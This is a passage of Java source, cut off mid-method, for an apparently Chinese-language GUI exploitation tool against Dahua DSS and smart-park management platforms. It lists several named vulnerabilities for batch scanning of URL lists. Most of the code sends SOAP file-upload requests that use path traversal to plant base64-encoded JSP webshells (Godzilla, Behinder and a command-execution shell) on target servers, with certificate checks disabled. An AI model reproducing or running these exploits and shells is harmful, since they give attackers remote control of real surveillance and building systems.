
import com.sun.javafx.application.HostServicesDelegate;
import javafx.application.Application;
import javafx.application.HostServices;
import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.*;
import javafx.stage.Stage;
import net.sf.json.JSONObject;



import javax.net.ssl.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.ResourceBundle;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class fc extends Application {


    @FXML
    private ComboBox<String> comboBox;


    @FXML
    private ComboBox<String> comber;

    @FXML
    private ComboBox<String> comboBox2;

    @FXML
    private ComboBox<String> comboBox3;

    @FXML
    private ComboBox<String> comboBox4;

    @FXML
    private RadioButton http;

    @FXML
    private RadioButton socks;


    @FXML
    private TextField dai1;

    @FXML
    private TextField dai2;

    @FXML
    private TextField dai3;

    @FXML
    private TextField dai4;

    @FXML
    private TextArea dai5;

    @FXML
    private RadioButton dai6;

    @FXML
    private TextArea url10;

    @FXML
    private TextField ml;

    public class SampleController implements Initializable {

        @FXML
        private void initialize() {

        }

        @Override
        public void initialize(URL location, ResourceBundle resources) {

        }
    }

    @FXML
    void daili1(ActionEvent event) {


        //       e.printStackTrace();


    }


    @FXML
    private TextField test3;


    @FXML
    private TextArea test1;

    @FXML
    private TextField test2;

    @FXML
    private TextArea cmd;

    @FXML
    private TextArea cmd1;

    @FXML
    private TextField url1;

    @FXML
    private TextField url2;

    @FXML
    private TextArea url6;

    @FXML
    private TextField url9;

    @FXML
    void re3(ActionEvent event) {

        String selectedItem = comboBox2.getValue();


        if ("ALL".equals(selectedItem)) {

            Alert alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("拼写检查");
            alert.setHeaderText("");
            alert.setContentText("请选择模块！");
            alert.showAndWait();
        } else if ("Godzilla".equals(selectedItem)) {

            video1();
        } else if ("Behinder".equals(selectedItem)) {

            video2();
        } else if ("jspcmdshell".equals(selectedItem)) {

            video3();
        } else if ("测试文件".equals(selectedItem)) {

            video4();
        }


    }

    @FXML
    void re4(ActionEvent event) {

        String selectedItem = comboBox2.getValue();


        if ("ALL".equals(selectedItem)) {

            Alert alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("拼写检查");
            alert.setHeaderText("");
            alert.setContentText("请选择模块！");
            alert.showAndWait();
        } else if ("Godzilla".equals(selectedItem)) {

            emap1();
        }else if ("Behinder".equals(selectedItem)) {

            emap2();
        }else if ("jspcmdshell".equals(selectedItem)) {

            emap3();
        } else if ("测试文件".equals(selectedItem)) {

            emap4();
        }
    }

    @FXML
    void daili(ActionEvent event) {
        //    dailipeizhi();
    }

    @FXML
    void pl1(ActionEvent event) {
        Task<Void> task = new Task<Void>() {
            @Override
            protected Void call() throws Exception {
                List<String> lines = readTextFile("url.txt");
                for (String line : lines) {
                    plcmd(line);
                }
                return null;
            }
        };

        new Thread(task).start();

    }


    @FXML
    void pl(ActionEvent event) {


        String selectedItem = comboBox4.getValue();


        if ("All".equals(selectedItem)) {
            Alert alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("拼写检查");
            alert.setHeaderText("");
            alert.setContentText("请选择模块！");
            alert.showAndWait();

        } else if ("大华DSS数字监控系统远程命令执行漏洞".equals(selectedItem)) {
            url10.appendText("正在开始批量检测,已选择大华DSS数字监控系统远程命令执行漏洞,请耐心等待检测结束！" + "\n");
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    List<String> lines = readTextFile("url.txt");
                    for (String line : lines) {
                        plcmd(line);
                    }
                    return null;
                }
            };

            new Thread(task).start();
        } else if ("大华智慧园区综合管理平台信息泄露漏洞".equals(selectedItem)) {
            url10.appendText("正在开始批量检测,已选择大华智慧园区综合管理平台信息泄露漏洞,请耐心等待检测结束！" + "\n");
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    List<String> lines = readTextFile("url.txt");
                    for (String line : lines) {
                        pl1(line);
                    }
                    return null;
                }
            };

            new Thread(task).start();


        } else if ("大华智能物联综合管理平台justForTest用户登录漏洞".equals(selectedItem)) {
            url10.appendText("正在开始批量检测,已选择大华智能物联综合管理平台justForTest用户登录漏洞,请耐心等待检测结束！" + "\n");
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    List<String> lines = readTextFile("url.txt");
                    for (String line : lines) {
                        pl2(line);
                    }
                    return null;
                }
            };

            new Thread(task).start();


        } else if ("大华DSS数字监控系统attachment_clearTempFile.action注入漏洞".equals(selectedItem)) {
            url10.appendText("正在开始批量检测,已选择大华DSS数字监控系统attachment_clearTempFile.action注入漏洞,请耐心等待检测结束！" + "\n");
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    List<String> lines = readTextFile("url.txt");
                    for (String line : lines) {
                        pl3(line);
                    }
                    return null;
                }
            };

            new Thread(task).start();


        } else if ("大华DSS数字监控系统itcBulletin注入漏洞".equals(selectedItem)) {
            url10.appendText("正在开始批量检测,已选择大华DSS数字监控系统itcBulletin注入漏洞,请耐心等待检测结束！" + "\n");
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    List<String> lines = readTextFile("url.txt");
                    for (String line : lines) {
                        pl5(line);
                    }
                    return null;
                }
            };

            new Thread(task).start();


        } else if ("大华智慧园区综合管理平台clientserver注入".equals(selectedItem)) {
            url10.appendText("正在开始批量检测,已选择大华智慧园区综合管理平台clientserver注入,请耐心等待检测结束！" + "\n");
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    List<String> lines = readTextFile("url.txt");
                    for (String line : lines) {
                        pl6(line);
                    }
                    return null;
                }
            };

            new Thread(task).start();


        } else if ("大华智慧园区综合管理平台searchJson注入漏洞".equals(selectedItem)) {
            url10.appendText("正在开始批量检测,已选择大华智慧园区综合管理平台searchJson注入漏洞,请耐心等待检测结束！" + "\n");
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    List<String> lines = readTextFile("url.txt");
                    for (String line : lines) {
                        pl7(line);
                    }
                    return null;
                }
            };

            new Thread(task).start();


        } else if ("大华智慧园区综合管理平台poi任意文件上传漏洞".equals(selectedItem)) {
            url10.appendText("正在开始批量检测,已选择大华智慧园区综合管理平台poi任意文件上传漏洞,请耐心等待检测结束！" + "\n");
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    List<String> lines = readTextFile("url.txt");
                    for (String line : lines) {
                        pl8(line);
                    }
                    return null;
                }
            };

            new Thread(task).start();


        } else if ("大华智慧园区综合管理平台video任意文件上传漏洞".equals(selectedItem)) {
            url10.appendText("正在开始批量检测,已选择大华智慧园区综合管理平台video任意文件上传漏洞,请耐心等待检测结束！" + "\n");
            Task<Void> task = new Task<Void>() {
                @Override
                protected Void call() throws Exception {
                    List<String> lines = readTextFile("url.txt");
                    for (String line : lines) {
                        pl9(line);
                    }
                    return null;
                }
            };

            new Thread(task).start();


        }

    }


    @FXML
    void rce16(ActionEvent event) {
        Alert alert = new Alert(Alert.AlertType.ERROR);
        alert.setTitle("");
        alert.setHeaderText("");
        alert.setContentText("待开发");
        alert.showAndWait();
    }

    @FXML
    void re2(ActionEvent event) {

        String selectedItem = comboBox2.getValue();


        if ("ALL".equals(selectedItem)) {

            Alert alert = new Alert(Alert.AlertType.ERROR);
            alert.setTitle("拼写检查");
            alert.setHeaderText("");
            alert.setContentText("请选择模块！");
            alert.showAndWait();
        } else if ("Godzilla".equals(selectedItem)) {

            gsl();

        } else if ("Behinder".equals(selectedItem)) {

            bx();


        } else if ("jspcmdshell".equals(selectedItem)) {

            jspshell();


        } else if ("测试文件".equals(selectedItem)) {

            ceshi();

        }

    }

    public void gsl() {


        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        // if (!isValidUrl(url)) {
        //       test1.appendText("输入的不是有效的网址" + "\n");
        //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        //  } else {


        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            // System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/emap/webservice/gis/soap/poi");
            String json = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
                    "xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n" +
                    "<soapenv:Header/>\n" +
                    "<soapenv:Body>\n" +
                    "<res:uploadPicFile>\n" +
                    "<!--type:string-->\n" +
                    "<arg0>/../../gsl.jsp</arg0>\n" +
                    "<!--type:base64Binary-->\n" +
                    "<arg1>PCUhIFN0cmluZyB4YyA9ICI1ZjRkY2MzYjVhYTc2NWQ2IjtjbGFzcyBYIGV4dGVuZHMgQ2xhc3NMb2FkZXIge3B1YmxpYyBYKENsYXNzTG9hZGVyIHopIHtzdXBlcih6KTsgfXB1YmxpYyBDbGFzcyBRKGJ5dGVbXSBjYikge3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhjYiwgMCwgY2IubGVuZ3RoKTt9fXB1YmxpYyBieXRlW10geChieXRlW10gcywgYm9vbGVhbiBtKSB7dHJ5IHtqYXZheC5jcnlwdG8uQ2lwaGVyIGMgPSBqYXZheC5jcnlwdG8uQ2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtDbGFzczw/PiBhQ2xhc3MgPSBDbGFzcy5mb3JOYW1lKCJqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjIik7amF2YS5sYW5nLnJlZmxlY3QuQ29uc3RydWN0b3I8Pz5jb25zdHJ1Y3RvciA9IGFDbGFzcy5nZXRDb25zdHJ1Y3RvcihieXRlW10uY2xhc3MsIFN0cmluZy5jbGFzcyk7amF2YXguY3J5cHRvLnNwZWMuU2VjcmV0S2V5U3BlYyBza2V5U3BlYyA9IChqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKSBjb25zdHJ1Y3Rvci5uZXdJbnN0YW5jZSh4Yy5nZXRCeXRlcygpLCAiQUVTIik7Yy5pbml0KG0gPyAxIDogMiwgc2tleVNwZWMpO2J5dGVbXSByZXN1bHQgPSAoYnl0ZVtdKSBjLmdldENsYXNzKCkuLypaNVQweW52SGI1Ki9nZXREZWNsYXJlZE1ldGhvZC8qWjVUMHludkhiNSovKCJkb0ZpbmFsIiwgbmV3IENsYXNzW117Ynl0ZVtdLmNsYXNzfSkuaW52b2tlKGMsIG5ldyBPYmplY3RbXXtzfSk7cmV0dXJuIHJlc3VsdDsgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHtyZXR1cm4gbnVsbDt9fSAlPjwlICB0cnkge2J5dGVbXSBDNzA3ID0gbmV3IGJ5dGVbSW50ZWdlci5wYXJzZUludChyZXF1ZXN0LmdldEhlYWRlcigiQ29udGVudC1MZW5ndGgiKSldOyBqYXZhLmlvLklucHV0U3RyZWFtIGlucHV0U3RyZWFtID0gcmVxdWVzdC5nZXRJbnB1dFN0cmVhbSgpOyBpbnQgX251bSA9IDA7IHdoaWxlICgoX251bSArPSBpbnB1dFN0cmVhbS5yZWFkKEM3MDcsIF9udW0sIEM3MDcubGVuZ3RoKSkgPCBDNzA3Lmxlbmd0aCkgOyBDNzA3ID0geChDNzA3LCBmYWxzZSk7IGlmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpID09IG51bGwpIHtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsIG5ldyBYKFRocmVhZC5jdXJyZW50VGhyZWFkKCkuLypaNVQweW52SGI1Ki9nZXRDb250ZXh0Q2xhc3NMb2FkZXIoKSkuUShDNzA3KSk7IH0gZWxzZSB7cmVxdWVzdC5zZXRBdHRyaWJ1dGUoInBhcmFtZXRlcnMiLCBDNzA3KTtPYmplY3QgZiA9ICgoQ2xhc3MpIHNlc3Npb24uZ2V0QXR0cmlidXRlKCJwYXlsb2FkIikpLm5ld0luc3RhbmNlKCk7amF2YS5pby5CeXRlQXJyYXlPdXRwdXRTdHJlYW0gYXJyT3V0ID0gbmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7Zi5lcXVhbHMoLypaNVQweW52SGI1Ki9hcnJPdXQpO2YuZXF1YWxzKC8qWjVUMHludkhiNSovcGFnZUNvbnRleHQpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRPdXRwdXRTdHJlYW0oKS53cml0ZSh4KGFyck91dC50b0J5dGVBcnJheSgpLCB0cnVlKSk7IH19IGNhdGNoIChFeGNlcHRpb24gZSkge30gJT4=</arg1>\n" +
                    "</res:uploadPicFile>\n" +
                    "</soapenv:Body>\n" +
                    "</soapenv:Envelope>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml; charset=UTF-8");
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(json);
            writer.close();


            int responseCode = connection.getResponseCode();


            if (responseCode == HttpURLConnection.HTTP_OK) {


                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                String inputLine;
                response.append(inputLine = br.readLine());
                while ((inputLine = br.readLine()) != null) {
                }
                response.append(inputLine);

                //    cmd1.appendText(response.toString());
                //  String pattern = "<code>\\s*1\\s*</code>";
                //  Pattern r = Pattern.compile(pattern);
                //   Matcher m = r.matcher(response.toString());

                //   if (m.find()) {

                gslbug();
                //    cmd1.appendText(formattedDateTime + "写入成功" + url + "/upload/g.jsp" + "密码：password" + "\n");
                //cmd1.appendText(response.toString());


            } else {

                   cmd1.appendText(formattedDateTime + "哥斯拉写入失败" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
              cmd1.appendText(formattedDateTime + "哥斯拉写入失败null" + "\n");
            //  e.printStackTrace();
        }


    }

    public void bx() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        // if (!isValidUrl(url)) {
        //       test1.appendText("输入的不是有效的网址" + "\n");
        //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        //  } else {


        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  System.setProperty("http.proxyHost", "127.0.0.1");
            //   System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/emap/webservice/gis/soap/poi");
            String json = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
                    "xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n" +
                    "<soapenv:Header/>\n" +
                    "<soapenv:Body>\n" +
                    "<res:uploadPicFile>\n" +
                    "<!--type:string-->\n" +
                    "<arg0>/../../bx.jsp</arg0>\n" +
                    "<!--type:base64Binary-->\n" +
                    "<arg1>PCUhIHB1YmxpYyBieXRlW10gQTg5OUwoU3RyaW5nIFN0cmluZ3MsU3RyaW5nIGspIHsgdHJ5IHtqYXZheC5jcnlwdG8uQ2lwaGVyIEIza1Y3cCA9IGphdmF4LmNyeXB0by5DaXBoZXIuZ2V0SW5zdGFuY2UoIkFFUy9FQ0IvUEtDUzVQYWRkaW5nIik7QjNrVjdwLmluaXQoamF2YXguY3J5cHRvLkNpcGhlci5ERUNSWVBUX01PREUsIChqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKSBDbGFzcy5mb3JOYW1lKCJqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjIikuZ2V0Q29uc3RydWN0b3IoYnl0ZVtdLmNsYXNzLCBTdHJpbmcuY2xhc3MpLm5ld0luc3RhbmNlKGsuZ2V0Qnl0ZXMoKSwgIkFFUyIpKTtpbnRbXSBhYSA9IG5ldyBpbnRbXXs5OSwgMTAxLCAxMjYsIDYyLCAxMjUsIDEyMSwgOTksIDExNSwgNjIsIDgyLCA4MSwgNjcsIDg1LCAzOCwgMzYsIDg0LCAxMTcsIDExNSwgMTI3LCAxMTYsIDExNywgOTh9O1N0cmluZyBjY3N0ciA9ICIiO2ZvciAoaW50IGkgPSAwOyBpIDwgYWEubGVuZ3RoOyBpKyspIHsgYWFbaV0gPSBhYVtpXSBeIDB4MDEwO2Njc3RyID0gY2NzdHIgKyAoY2hhcikgYWFbaV07fWJ5dGVbXSBieXRlcyA9IChieXRlW10pIENsYXNzLmZvck5hbWUoY2NzdHIpLmdldE1ldGhvZCgiZGVjb2RlQnVmZmVyIiwgU3RyaW5nLmNsYXNzKS5pbnZva2UoQ2xhc3MuZm9yTmFtZShjY3N0cikubmV3SW5zdGFuY2UoKSwgU3RyaW5ncyk7Ynl0ZVtdIHJlc3VsdCA9IChieXRlW10pIEIza1Y3cC5nZXRDbGFzcygpLi8qWlYzeTEwUTJhMyovZ2V0RGVjbGFyZWRNZXRob2QvKlpWM3kxMFEyYTMqLygiZG9GaW5hbCIsIG5ldyBDbGFzc1tde2J5dGVbXS5jbGFzc30pLmludm9rZShCM2tWN3AsbmV3IE9iamVjdFtde2J5dGVzfSk7cmV0dXJuIHJlc3VsdDt9IGNhdGNoIChFeGNlcHRpb24gZSkge2UucHJpbnRTdGFja1RyYWNlKCk7cmV0dXJuIG51bGw7fSB9ICU+PCUgIHRyeSB7ICBTdHJpbmcgSzAzNzI3RSA9ICI1ZjRkY2MzYjVhYTc2NWQ2IjsgIHNlc3Npb24ucHV0VmFsdWUoInUiLCBLMDM3MjdFKTsgIGJ5dGVbXSBJODE3UEE2ID0gQTg5OUwgKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSxLMDM3MjdFKTsgIGphdmEuLypaVjN5MTBRMmEzKi9sYW5nLi8qWlYzeTEwUTJhMyovcmVmbGVjdC5NZXRob2QgQTg5OUwgPSBDbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3NMb2FkZXIiKS5nZXREZWNsYXJlZE1ldGhvZC8qWlYzeTEwUTJhMyovKCJkZWZpbmVDbGFzcyIsYnl0ZVtdLmNsYXNzLGludC8qKi8uY2xhc3MsaW50LyoqLy5jbGFzcyk7ICBBODk5TC5zZXRBY2Nlc3NpYmxlKHRydWUpOyAgQ2xhc3MgaSA9IChDbGFzcylBODk5TC5pbnZva2UoVGhyZWFkLmN1cnJlbnRUaHJlYWQoKS4vKlpWM3kxMFEyYTMqL2dldENvbnRleHRDbGFzc0xvYWRlcigpLCBJODE3UEE2ICwgMCwgSTgxN1BBNi5sZW5ndGgpOyAgT2JqZWN0IFEwNTkgPSBpLi8qWlYzeTEwUTJhMyovbmV3SW5zdGFuY2UoKTsgIFEwNTkuZXF1YWxzKHBhZ2VDb250ZXh0KTsgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHtyZXNwb25zZS5zZW5kRXJyb3IoNDA0KTt9ICU+</arg1>\n" +
                    "</res:uploadPicFile>\n" +
                    "</soapenv:Body>\n" +
                    "</soapenv:Envelope>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml; charset=UTF-8");
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(json);
            writer.close();


            //   test1.appendText(response.toString());
            int responseCode = connection.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {

                bxbug();


                //       String pattern = "<code>\\s*1\\s*</code>";
                //     Pattern r = Pattern.compile(pattern);
                //     Matcher m = r.matcher(response.toString());

                //    if (m.find()) {


                //    cmd1.appendText(formattedDateTime + "写入成功" + url + "/upload/b.jsp" + "密码：password" + "\n");
                //     cmd.appendText(formattedDateTime + url + "/portal/services/itcBulletin" + "\n");


            } else {

                   cmd1.appendText(formattedDateTime + "冰蝎写入失败" + "\n");
            }


        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
              cmd1.appendText(formattedDateTime + "冰蝎写入失败null" + "\n");
        }


    }

    public void jspshell() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        // if (!isValidUrl(url)) {
        //       test1.appendText("输入的不是有效的网址" + "\n");
        //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        //  } else {


        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //    System.setProperty("http.proxyHost", "127.0.0.1");
            //    System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/emap/webservice/gis/soap/poi");
            String json = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
                    "xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n" +
                    "<soapenv:Header/>\n" +
                    "<soapenv:Body>\n" +
                    "<res:uploadPicFile>\n" +
                    "<!--type:string-->\n" +
                    "<arg0>/../../jsh.jsp</arg0>\n" +
                    "<!--type:base64Binary-->\n" +
                    "<arg1>PCUgIENsYXNzPD8+IENjSzIgPSBDbGFzcy5mb3JOYW1lKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsxMDYsIDk3LCAxMTgsIDk3LCA0NiwgMTA4LCA5NywgMTEwLCAxMDMsIDQ2LCA4MiwgMTE3LCAxMTAsIDExNiwgMTA1LCAxMDksIDEwMX0pKTtqYXZhLmxhbmcucmVmbGVjdC5NZXRob2QgRVBsdkQzOTMgPSBDY0syLmdldE1ldGhvZChuZXcgU3RyaW5nKG5ldyBieXRlW117MTAxLCAxMjAsIDEwMSwgOTl9KSwgU3RyaW5nLmNsYXNzKTtPYmplY3QgR0ttQjVtTXQgPSBFUGx2RDM5My5pbnZva2UoIENjSzIuZ2V0TWV0aG9kKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsxMDMsIDEwMSwgMTE2LCA4MiwgMTE3LCAxMTAsIDExNiwgMTA1LCAxMDksIDEwMX0pKS5pbnZva2UobnVsbCwgbmV3IE9iamVjdFtde30pLCBuZXcgT2JqZWN0W117cmVxdWVzdC5nZXRQYXJhbWV0ZXIoInBhc3N3b3JkIil9KTtqYXZhLmxhbmcucmVmbGVjdC5NZXRob2QgUUU3RSA9IEdLbUI1bU10LmdldENsYXNzKCkuZ2V0TWV0aG9kKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsxMDMsIDEwMSwgMTE2LCA3MywgMTEwLCAxMTIsIDExNywgMTE2LCA4MywgMTE2LCAxMTQsIDEwMSwgOTcsIDEwOX0pKTtRRTdFLnNldEFjY2Vzc2libGUodHJ1ZSk7amF2YS51dGlsLlNjYW5uZXIgcyA9IG5ldyBqYXZhLnV0aWwuU2Nhbm5lcigoamF2YS5pby5JbnB1dFN0cmVhbSkgUUU3RS5pbnZva2UoR0ttQjVtTXQsIG5ldyBPYmplY3RbXXt9KSkudXNlRGVsaW1pdGVyKCJBIik7U3RyaW5nIHJlc3VsdCA9IHMuaGFzTmV4dCgpID8gcy5uZXh0KCkgOiAiIjtvdXQucHJpbnQoIjxwcmU+Iik7b3V0LnByaW50KHJlc3VsdCk7b3V0LnByaW50KCI8L3ByZT4iKTsgJT4=</arg1>\n" +
                    "</res:uploadPicFile>\n" +
                    "</soapenv:Body>\n" +
                    "</soapenv:Envelope>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/xml; charset=UTF-8");
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(json);
            writer.close();


            //    test1.appendText(response.toString());
            int responseCode = connection.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {


                jspshellbug();
                //  cmd1.appendText(formattedDateTime + "写入成功" + url + "/upload/j.jsp" + "密码：password" + "\n");
                //     cmd.appendText(formattedDateTime + url + "/portal/services/itcBulletin" + "\n");


            } else {

                  cmd1.appendText(formattedDateTime + "jspcmdshell写入失败" + "\n");


            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
              cmd1.appendText(formattedDateTime + "jspcmdshell写入失败null" + "\n");
            //   System.out.println(e);
        }


    }


    public void ceshi() {

        String url = test2.getText();
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
        }
        // if (!isValidUrl(url)) {
        //       test1.appendText("输入的不是有效的网址" + "\n");
        //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
        //  } else {


        try {

            HostnameVerifier hv = new HostnameVerifier() {
                @Override
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };

            TrustManager[] trustAllCerts = {new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //   System.setProperty("http.proxyHost", "127.0.0.1");
            //  System.setProperty("http.proxyPort", "8080");
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/emap/webservice/gis/soap/poi");
            String json = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
                    "xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\">\n" +
                    "<soapenv:Header/>\n" +
                    "<soapenv:Body>\n" +
                    "<res:uploadPicFile>\n" +
                    "<!--type:string-->\n" +
                    "<arg0>/../../ces.jsp</arg0>\n" +
                    "<!--type:base64Binary-->\n" +
                    "<arg1>aGVsbG8gY2VzaGkgaXMgb2s=</arg1>\n" +
                    "</res:uploadPicFile>\n" +
                    "</soapenv:Body>\n" +
                    "</soapenv:Envelope>";
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
